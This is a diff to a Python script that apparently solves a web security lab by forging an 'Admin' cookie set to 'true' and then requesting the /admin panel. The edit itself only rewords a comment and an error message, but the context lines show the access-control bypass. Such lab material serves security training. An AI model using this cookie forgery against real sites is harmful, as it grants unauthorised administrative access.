@@ -36,13 +36,13 @@ cookies = {
 print(Fore.WHITE + "1. Changing the cookie 'Admin' to 'true'.. " + Fore.GREEN + "OK")
 
 try:
-    # fetch admin panel
+    # fetch the admin panel
     # this step is not necessary in the script, you can do step 2 directrly
     # it's a must only when solving the lab using the browser
     admin_panel = requests.get(f"{url}/admin", cookies=cookies)
     
 except:
-    print(Fore.RED + "[!] Failed to fetch admin panel through exception")
+    print(Fore.RED + "[!] Failed to fetch the admin panel through exception")
     exit(1)
 
 print(Fore.WHITE + "2. Fetching the admin panel.. " + Fore.GREEN + "OK")
